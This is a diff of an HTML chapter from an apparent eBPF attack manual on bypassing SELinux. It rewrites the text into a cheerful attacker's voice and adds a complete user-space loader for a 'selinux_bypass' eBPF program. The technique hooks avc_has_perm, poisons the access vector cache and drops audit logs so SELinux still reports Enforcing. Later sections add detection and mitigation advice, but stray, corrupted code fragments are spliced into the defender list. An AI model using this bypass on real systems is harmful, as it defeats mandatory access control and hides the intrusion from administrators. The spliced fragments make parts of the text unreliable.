@@ -54,7 +54,7 @@
                     
                     
                     <a href="/dBPF/chapter-0-field-manual-preface.html" >
-                        Chapter 0: Field Manual Preface
+                        Preface
                     </a>
                     
                 
@@ -181,9 +181,17 @@
                     <div class="post-content">
                         <h1 id="silencing-selinux-bypassing-mandatory-access-controls">Silencing SELinux: Bypassing Mandatory Access Controls</h1>
 
-<p><strong>Wut</strong></p>
+<p><strong>Chapter 7: Act II Begins - Conquering the Unconquerable</strong></p>
 
-<p>Poisoning the AVC cache and dropping audit logs so SELinux reports Enforcing yet allows every forbidden read and exec. This technique enables attackers to bypass one of Linux’s strongest security mechanisms while maintaining the appearance that it’s fully operational.</p>
+<p>Welcome to Act II of our story. You’ve mastered the fundamentals—you can bypass basic security controls, escape containers, evade monitoring, and operate without constraints. Now it’s time to tackle the big targets.</p>
+
+<p>SELinux represents the ultimate challenge. It’s supposed to be the one security mechanism that even root can’t bypass—mandatory access control that operates independently of traditional Unix permissions. If you can silence SELinux, you can silence anything.</p>
+
+<p>SELinux is supposed to be the ultimate security enforcer—mandatory access control that even root can’t bypass. It’s the bouncer at the kernel nightclub, checking everyone’s ID and making sure they’re on the list.</p>
+
+<p>But what if we could slip the bouncer a twenty and convince him to look the other way? What if we could make SELinux think it’s doing its job while we waltz right past all those access controls?</p>
+
+<p>We’re going to silence SELinux—not by disabling it (that would be too obvious), but by making it lie about what it’s seeing. This is where you learn that even the most hardened security mechanisms are just kernel code, and kernel code can be influenced.</p>
 
 <pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
 graph TD
@@ -210,23 +218,29 @@ graph TD
     click G "https://man7.org/linux/man-pages/man7/audit.7.html" "Linux Audit Documentation"
 </code></pre>
 
-<p><strong>Why</strong></p>
+<p><strong>Why SELinux Just Became Optional</strong></p>
 
-<p>Because eBPF + misconfiguration =&gt; broken isolation. SELinux provides mandatory access controls that restrict what resources processes can access, regardless of traditional Unix permissions. By manipulating the Access Vector Cache (AVC) and dropping audit logs, attackers can bypass these controls while the system still reports that SELinux is enforcing—creating a dangerous false sense of security.</p>
-<h2 id="technical-details">Technical Details</h2>
+<p>Here’s what makes SELinux scary from an attacker’s perspective: it’s supposed to be mandatory. Even if you compromise root, even if you own the entire system, SELinux is supposed to keep enforcing those access controls.</p>
 
-<h3 id="selinux-architecture">SELinux Architecture</h3>
+<p>But here’s the thing about “mandatory”—it’s only as mandatory as the code that enforces it. And if you can influence that code…</p>
 
-<p>SELinux provides mandatory access controls through:</p>
+<p>That’s where eBPF comes in. We’re not going to fight SELinux head-on. We’re not going to try to disable it or modify its policies. We’re going to become SELinux—or at least, we’re going to become the part of SELinux that makes the final access control decisions.</p>
+
+<p>The beautiful part is that everything looks completely normal. SELinux is still running, policies are still loaded, other processes still get denied when they should. But for our processes? The access control decisions mysteriously always come back as “allow.”</p>
+<h2 id="how-we-become-the-security-system">How We Become the Security System</h2>
+
+<h3 id="understanding-selinuxs-inner-workings">Understanding SELinux’s Inner Workings</h3>
+
+<p>SELinux is like having a paranoid security guard who checks everyone’s ID against a massive rulebook:</p>
 <ul>
-  <li><strong>Policy</strong>: Rules defining what subjects (processes) can access which objects (files, sockets, etc.)</li>
-  <li><strong>Labels</strong>: Security contexts assigned to all subjects and objects</li>
-  <li><strong>Enforcement</strong>: Kernel mechanisms that check access against policy</li>
-  <li><strong>AVC</strong>: Access Vector Cache that stores previous access decisions for performance</li>
-  <li><strong>Auditing</strong>: Logging of policy violations and enforcement actions</li>
+  <li><strong>Policy</strong>: The rulebook that says who can do what to what</li>
+  <li><strong>Labels</strong>: Security badges that everything gets (processes, files, sockets, you name it)</li>
+  <li><strong>Enforcement</strong>: The actual checking mechanism that says yes or no</li>
+  <li><strong>AVC</strong>: A cache that remembers previous decisions so it doesn’t have to look everything up again</li>
+  <li><strong>Auditing</strong>: The logbook that records every time someone gets denied</li>
 </ul>
 
-<p>When a process attempts to access a resource, SELinux checks if the operation is allowed based on the security contexts and policy rules.</p>
+<p>Every time a process wants to touch something, SELinux checks the badges and consults the rulebook.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -298,7 +312,7 @@ graph TD
 └─────────────────────────────────────────────────────────────┘
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>When eBPF is used to manipulate SELinux, the architecture is subverted:</p>
+<p>But here’s what happens when we slip our eBPF program into the decision-making process:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -380,16 +394,19 @@ graph TD
 └─────────────────────────────────────────────────────────────┘
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<h3 id="exploitation-technique">Exploitation Technique</h3>
+<h3 id="how-we-hijack-the-decision-process">How We Hijack the Decision Process</h3>
 
-<p>The exploit leverages eBPF’s ability to attach to kernel functions that implement SELinux checks. By intercepting these calls, an attacker can:</p>
+<p>Our strategy is to become part of the SELinux decision-making process:</p>
 
 <ol>
-  <li><strong>Hook decision functions</strong>: Attach to functions like <code class="language-plaintext highlighter-rouge">avc_has_perm()</code> or <code class="language-plaintext highlighter-rouge">security_compute_av()</code></li>
-  <li><strong>Poison the AVC</strong>: Inject false “allow” decisions into the cache
-    <h3 id="comprehensive-poc">Comprehensive POC</h3>
-  </li>
+  <li><strong>Hook the Decision Makers</strong>: We attach to functions like <a href="https://elixir.bootlin.com/linux/latest/source/security/selinux/avc.c"><code class="language-plaintext highlighter-rouge">avc_has_perm()</code></a> that make the final call</li>
+  <li><strong>Poison the Cache</strong>: We inject fake “allow” decisions into the AVC so future checks pass</li>
+  <li><strong>Stay Invisible</strong>: We only modify decisions for our processes, leaving everything else untouched</li>
 </ol>
+
+<p>The beauty is that SELinux is still running and still denying other processes—we’re just making ourselves exempt.</p>
+
+<h3 id="building-our-selinux-bypass">Building Our SELinux Bypass</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -1034,7 +1051,10 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="err">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+
+<h3 id="user-space-control-program">User-Space Control Program</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -1045,26 +1065,334 @@ graph TD
 9
 10
 11
-</pre></td><td class="rouge-code"><pre>char comm[MAX_COMM_LEN];
-bpf_get_current_comm(&amp;comm, sizeof(comm));
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the SELinux Bypass eBPF program</span>
 
-if (should_bypass_command(comm)) {
-    // Add this process to our tracking map
-    u8 value = 1;
-    bpf_map_update_elem(&amp;target_processes, &amp;pid, &amp;value, BPF_ANY);
-    return true;
-}
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"selinux_bypass.skel.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
 
-return false; }
+<span class="c1">// Structure for SELinux events (must match the BPF version)</span>
+<span class="k">struct</span> <span class="n">selinux_event</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">uint64_t</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">uint16_t</span> <span class="n">tclass</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">requested</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">allowed</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">denied</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">modified</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">scontext</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">tcontext</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="c1">// Handle events from the eBPF program</span>
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">selinux_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">timestamp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">time_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">timestamp</span> <span class="o">/</span> <span class="mi">1000000000</span><span class="p">;</span>
+    <span class="n">strftime</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">timestamp</span><span class="p">),</span> <span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">,</span> <span class="n">localtime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="p">));</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[%s] Process %d (%s): SELinux bypass</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Target class: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">tclass</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Requested permissions: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">requested</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Original allowed: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">allowed</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Original denied: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">denied</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Modified: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">modified</span> <span class="o">?</span> <span class="s">"YES"</span> <span class="o">:</span> <span class="s">"NO"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">selinux_bypass_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="c1">// Set up signal handler</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// Increase resource limits</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+
+    <span class="c1">// Load and verify BPF program</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">selinux_bypass_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach BPF programs</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">selinux_bypass_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer for events</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">64</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"SELinux Bypass eBPF program successfully loaded and attached!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Bypassing SELinux for target processes...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">selinux_bypass_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>// Generate a unique ID for a SELinux event
-static __always_inline u64 generate_event_id(void) {
-    u64 ts = bpf_ktime_get_ns();
-    u32 pid = bpf_get_current_pid_tgid() » 32;
-    return (ts « 32) | pid;
-}</p>
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p>Defenders should implement multiple layers of detection:</p>
+
 <ol>
+  <li><strong>SELinux Audit Monitoring</strong>:
+    <ul>
+      <li>Monitor for missing audit events that should be generated</li>
+      <li>Look for processes that appear to have more permissions than their context allows</li>
+      <li>Track AVC cache hit rates for anomalies</li>
+    </ul>
+  </li>
+  <li><strong>eBPF Program Monitoring</strong>:
+    <ul>
+      <li>Monitor for eBPF programs attached to SELinux functions</li>
+      <li>Track eBPF program loading patterns and verify signatures</li>
+      <li>Use tools like <code class="language-plaintext highlighter-rouge">bpftool</code> to list and inspect loaded programs</li>
+    </ul>
+  </li>
+  <li><strong>Behavioral Analysis</strong>:
+    <ul>
+      <li>Look for discrepancies between SELinux policy and actual system behavior</li>
+      <li>Implement out-of-band monitoring that doesn’t rely on SELinux audit</li>
+      <li>Use statistical analysis to detect anomalies in access patterns</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF from containers</span>
+podman run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># Use seccomp to block BPF syscall</span>
+seccomp-bpf-filter.json:
+<span class="o">{</span>
+  <span class="s2">"defaultAction"</span>: <span class="s2">"SCMP_ACT_ALLOW"</span>,
+  <span class="s2">"syscalls"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"name"</span>: <span class="s2">"bpf"</span>,
+      <span class="s2">"action"</span>: <span class="s2">"SCMP_ACT_ERRNO"</span>
+    <span class="o">}</span>
+  <span class="o">]</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement BPF LSM Policies</strong>:
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">// Example BPF LSM policy to restrict BPF program loading</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"lsm/bpf"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">restrict_bpf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Only allow specific signing keys or programs from trusted paths</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_get_current_uid_gid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Enhanced SELinux Monitoring</strong>:
+    <ul>
+      <li>Deploy tools that can detect SELinux bypasses</li>
+      <li>Implement custom monitoring that doesn’t rely on kernel audit</li>
+      <li>Use hardware-based attestation where possible</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="real-world-impact">Real-world Impact</h3>
+
+<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of mandatory access controls, especially in high-security environments where SELinux is relied upon for defense-in-depth.</p>
+
+<p><strong>Attacker Perspective:</strong></p>
+<ol>
+  <li>Identify systems with SELinux enforcing mode</li>
+  <li>Map the SELinux decision-making functions</li>
+  <li>Develop eBPF programs that hook into these functions</li>
+  <li>Load the malicious BPF programs with appropriate privileges</li>
+  <li>Modify access control decisions to allow otherwise prohibited operations</li>
+  <li>Ensure audit logs show the expected “denied” messages while operations succeed</li>
+  <li>Maintain persistence through the eBPF programs</li>
+</ol>
+
+<p><strong>Defender Perspective:</strong></p>
+<ol>
+  <li>Remove CAP_BPF from untrusted processes and containers</li>
+  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
+  <li>Monitor for unexpected eBPF programs attached to security functions</li>
+  <li>Deploy multiple independent monitoring systems</li>
+  <li>Use hardware-based security where possible
+ u32 pid = bpf_get_current_pid_tgid() » 32;
+ return (ts « 32) | pid;
+}</li>
   <li><strong>Intercept audit events</strong>: Prevent logging of policy violations</li>
   <li><strong>Maintain appearances</strong>: Ensure the system still reports SELinux as enforcing</li>
 </ol>
